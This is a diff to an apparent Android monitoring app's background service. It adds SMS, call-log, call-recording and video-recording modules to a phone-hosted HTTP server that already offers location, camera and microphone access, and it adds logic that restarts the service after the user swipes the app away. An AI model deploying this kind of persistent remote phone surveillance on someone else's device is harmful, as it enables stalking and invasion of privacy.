@@ -15,10 +15,14 @@ import androidx.work.WorkManager
 import com.example.artemis.ArtemisApp
 import com.example.artemis.auth.AuthManager
 import com.example.artemis.data.AppDatabase
+import com.example.artemis.feature.CallLogsProvider
+import com.example.artemis.feature.CallRecorder
 import com.example.artemis.feature.CameraController
 import com.example.artemis.feature.DeviceInfoProvider
 import com.example.artemis.feature.LocationTracker
 import com.example.artemis.feature.MicController
+import com.example.artemis.feature.SmsProvider
+import com.example.artemis.feature.VideoRecorder
 import com.example.artemis.server.SimpleHttpServer
 import kotlinx.coroutines.CoroutineScope
 import kotlinx.coroutines.Dispatchers
@@ -37,6 +41,10 @@ class ArtemisSentinelService : Service() {
     private lateinit var locationTracker: LocationTracker
     private lateinit var cameraController: CameraController
     private lateinit var micController: MicController
+    private lateinit var callLogsProvider: CallLogsProvider
+    private lateinit var smsProvider: SmsProvider
+    private lateinit var callRecorder: CallRecorder
+    private lateinit var videoRecorder: VideoRecorder
     private lateinit var artemisServer: SimpleHttpServer
 
     private var wakeLock: PowerManager.WakeLock? = null
@@ -76,16 +84,23 @@ class ArtemisSentinelService : Service() {
         locationTracker = LocationTracker(this, database)
         cameraController = CameraController(this)
         micController = MicController(this)
+        callLogsProvider = CallLogsProvider(this)
+        smsProvider = SmsProvider(this)
+        callRecorder = CallRecorder(this)
+        videoRecorder = VideoRecorder(this)
     }
 
     override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
         when (intent?.action) {
             ACTION_START -> startServer()
             ACTION_STOP -> stopServer()
-            ACTION_RESTART -> {
-                stopServer()
-                startServer()
-            }
+            // onTaskRemoved sends this while the foreground service is
+            // normally still alive.  Stopping and immediately recreating the
+            // socket races the asynchronous close and can produce an
+            // "address already in use" failure.  START_STICKY creates a
+            // fresh service after a real process death, where isRunning is
+            // false and this starts it again.
+            ACTION_RESTART -> if (!isRunning) startServer()
             else -> {
                 if (!isRunning) startServer()
             }
@@ -106,15 +121,23 @@ class ArtemisSentinelService : Service() {
             deviceInfoProvider = deviceInfoProvider,
             locationTracker = locationTracker,
             cameraController = cameraController,
-            micController = micController
+            micController = micController,
+            callLogsProvider = callLogsProvider,
+            smsProvider = smsProvider,
+            callRecorder = callRecorder,
+            videoRecorder = videoRecorder
         )
 
         serviceScope.launch {
             try {
                 android.util.Log.i("ArtemisSvc", "Starting ArtemisServer...")
                 artemisServer.start()
+                app.serverRef = artemisServer
+                app.serverStartedAt = artemisServer.startTime
                 android.util.Log.i("ArtemisSvc", "ArtemisServer started, starting location tracking...")
                 startLocationTracking()
+                android.util.Log.i("ArtemisSvc", "Starting call recorder listener...")
+                callRecorder.startListening()
                 android.util.Log.i("ArtemisSvc", "Scheduling health check...")
                 scheduleHealthCheck()
                 android.util.Log.i("ArtemisSvc", "Updating notification...")
@@ -122,6 +145,7 @@ class ArtemisSentinelService : Service() {
                 android.util.Log.i("ArtemisSvc", "Server startup complete.")
             } catch (e: Exception) {
                 android.util.Log.e("ArtemisSvc", "Server start FAILED: ${e.message}", e)
+                app.serverRef = null
                 stopSelf()
             }
         }
@@ -133,8 +157,11 @@ class ArtemisSentinelService : Service() {
             try {
                 artemisServer.stop()
             } catch (_: Exception) { }
+            app.serverRef = null
             locationTracker.stopLocationUpdates()
             micController.release()
+            callRecorder.release()
+            videoRecorder.release()
             releaseWakeLock()
             stopForeground(STOP_FOREGROUND_REMOVE)
             stopSelf()
@@ -158,13 +185,22 @@ class ArtemisSentinelService : Service() {
 
     private fun createNotification(activeClients: Int): Notification {
         val deviceName = "${android.os.Build.MANUFACTURER} ${android.os.Build.MODEL}"
-        val contentText = if (activeClients > 0) {
-            "$deviceName — $activeClients connected"
+        val uptimeSec = ((System.currentTimeMillis() - app.serverStartedAt) / 1000)
+        val uptime = if (app.serverStartedAt > 0 && uptimeSec >= 0) {
+            val h = uptimeSec / 3600
+            val m = (uptimeSec % 3600) / 60
+            val s = uptimeSec % 60
+            "${h}h ${m}m ${s}s"
         } else {
-            "$deviceName — No clients connected"
+            "starting…"
+        }
+        val contentText = if (activeClients > 0) {
+            "$deviceName — $activeClients connected · up $uptime"
+        } else {
+            "$deviceName — up $uptime"
         }
         return NotificationCompat.Builder(this, ArtemisApp.CHANNEL_SERVICE)
-            .setContentTitle("Artemis Sentinel Active")
+            .setContentTitle("Artemis Sentinel v2.0.0 Active")
             .setContentText(contentText)
             .setSmallIcon(android.R.drawable.ic_menu_compass)
             .setPriority(NotificationCompat.PRIORITY_LOW)
@@ -200,14 +236,34 @@ class ArtemisSentinelService : Service() {
 
     override fun onBind(intent: Intent?): IBinder? = null
 
+    override fun onTaskRemoved(rootIntent: Intent?) {
+        super.onTaskRemoved(rootIntent)
+        // User swiped the app from recents. With stopWithTask=false and
+        // START_STICKY the service normally survives; Samsung's task killer
+        // can drop the process anyway, so re-arm explicitly. If the system
+        // blocks the background start (Android 12+), START_STICKY will
+        // restart the service with a null intent on the next opportunity —
+        // the null-intent branch of onStartCommand restarts the server.
+        android.util.Log.i("ArtemisSvc", "Task removed — re-arming service")
+        try {
+            val restart = Intent(this, ArtemisSentinelService::class.java).apply {
+                action = ACTION_RESTART
+            }
+            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
+                startForegroundService(restart)
+            } else {
+                startService(restart)
+            }
+        } catch (e: Exception) {
+            android.util.Log.w("ArtemisSvc", "Background restart blocked (${e.message}) — START_STICKY will re-arm")
+        }
+    }
+
     override fun onDestroy() {
         isRunning = false
+        app.serverRef = null
         serviceScope.cancel()
         releaseWakeLock()
         super.onDestroy()
-    }
-
-    override fun onTaskRemoved(rootIntent: Intent?) {
-        super.onTaskRemoved(rootIntent)
     }
 }
